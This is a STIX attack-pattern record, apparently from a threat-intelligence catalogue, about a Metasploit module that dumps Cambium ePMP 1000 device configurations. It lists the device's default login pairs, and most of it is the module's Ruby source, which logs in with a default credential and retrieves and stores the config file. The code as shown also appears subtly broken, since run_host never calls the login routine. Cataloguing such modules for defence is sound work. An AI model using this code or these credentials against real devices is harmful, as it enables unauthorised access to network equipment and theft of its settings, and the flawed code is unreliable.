{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9129f93d-55e2-4405-95cd-aadfa24bcd0b",
    "created": "2024-08-14T16:29:19.978786Z",
    "modified": "2024-08-14T16:29:19.97879Z",
    "name": "Cambium ePMP 1000 Dump Device Config",
    "description": " This module dumps Cambium ePMP 1000 device configuration file. An ePMP 1000 box has four (4) login accounts - admin/admin, installer/installer home/home, and readonly/readonly. This module requires any one of the following login credentials - admin / installer / home - to dump device configuration file. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/epmp1000_dump_config.rb",
            "external_id": "epmp1000_dump_config.rb"
        },
        {
            "source_name": "reference",
            "url": "http://ipositivesecurity.com/2015/11/28/cambium-epmp-1000-multiple-vulnerabilities/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::EPMP\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name' => 'Cambium ePMP 1000 Dump Device Config',\n      'Description' => %{\n          This module dumps Cambium ePMP 1000 device configuration file. An\n          ePMP 1000 box has four (4) login accounts - admin/admin, installer/installer,\n          home/home, and readonly/readonly. This module requires any one of the following\n          login credentials - admin / installer / home - to dump device configuration\n          file.\n      },\n      'Author' =>\n        [\n          'Karn Ganeshen <KarnGaneshen[at]gmail.com>'\n        ],\n      'References' =>\n        [\n          ['URL', 'http://ipositivesecurity.com/2015/11/28/cambium-epmp-1000-multiple-vulnerabilities/']\n        ],\n      'License' => MSF_LICENSE\n     )\n    )\n\n    register_options(\n      [\n        Opt::RPORT(80),\t# Application may run on a different port too. Change port accordingly.\n        OptString.new('USERNAME', [true, 'A specific username to authenticate as', 'installer']),\n        OptString.new('PASSWORD', [true, 'A specific password to authenticate with', 'installer'])\n      ], self.class\n    )\n\n    deregister_options('DB_ALL_CREDS', 'DB_ALL_PASS', 'DB_ALL_USERS', 'USER_AS_PASS', 'USERPASS_FILE', 'USER_FILE', 'PASS_FILE', 'BLANK_PASSWORDS', 'BRUTEFORCE_SPEED', 'STOP_ON_SUCCESS')\n  end\n\n  def run_host(ip)\n    unless is_app_epmp1000?\n      return\n    end\n  end\n\n  # Dump config\n  def dump_config(config_uri, cookie)\n    print_status(\"#{rhost}:#{rport} - Attempting to dump configuration...\")\n    res = send_request_cgi(\n      {\n        'method' => 'GET',\n        'uri' => config_uri,\n        'cookie' => cookie,\n        'headers' => {\n          'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',\n          'Accept-Language' => 'en-US,en;q=0.5',\n          'Connection' => 'close'\n        }\n      }, 25\n    )\n\n    good_response = (\n      res &&\n      res.code == 200 &&\n      res.body =~ /device_props/\n    )\n\n    if good_response\n      print_good(\"#{rhost}:#{rport} - File retrieved successfully!\")\n      path = store_loot('ePMP_config', 'text/plain', rhost, res.body, 'Cambium ePMP 1000 device config')\n      print_status(\"#{rhost}:#{rport} - File saved in: #{path}\")\n    else\n      print_error(\"#{rhost}:#{rport} - Failed to retrieve configuration\")\n    end\n  end\n\n  #\n  # Login & initiate dump_config\n  #\n\n  def do_login(epmp_ver)\n    if epmp_ver < '3.4.1' # <3.4.1 uses login_1\n      cookie, config_uri_dump_config = login_1(datastore['USERNAME'], datastore['PASSWORD'], epmp_ver)\n      if cookie == 'skip' && config_uri_dump_config == 'skip'\n        return\n      else\n        dump_config(config_uri_dump_config, cookie)\n      end\n    else\n      cookie, config_uri_dump_config = login_2(datastore['USERNAME'], datastore['PASSWORD'], epmp_ver) # 3.4.1+ uses login_2\n      if cookie == 'skip' && config_uri_dump_config == 'skip'\n        return\n      else\n        dump_config(config_uri_dump_config, cookie)\n      end\n    end\n  end\nend\n"
}